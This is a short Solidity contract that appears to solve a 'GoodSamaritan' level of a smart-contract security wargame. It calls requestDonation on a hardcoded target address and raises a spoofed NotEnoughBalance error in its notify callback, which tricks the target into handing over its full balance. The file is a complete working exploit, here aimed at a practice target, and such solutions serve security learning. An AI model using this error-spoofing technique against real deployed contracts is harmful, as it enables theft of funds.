// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "../src/GoodSamaritan.sol";

contract Solve {
    error NotEnoughBalance();

    function run() external {
        GoodSamaritan victim = GoodSamaritan(0x7CC1e6f5D96FAb707662d91AbAF3083213FD749a);
        victim.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}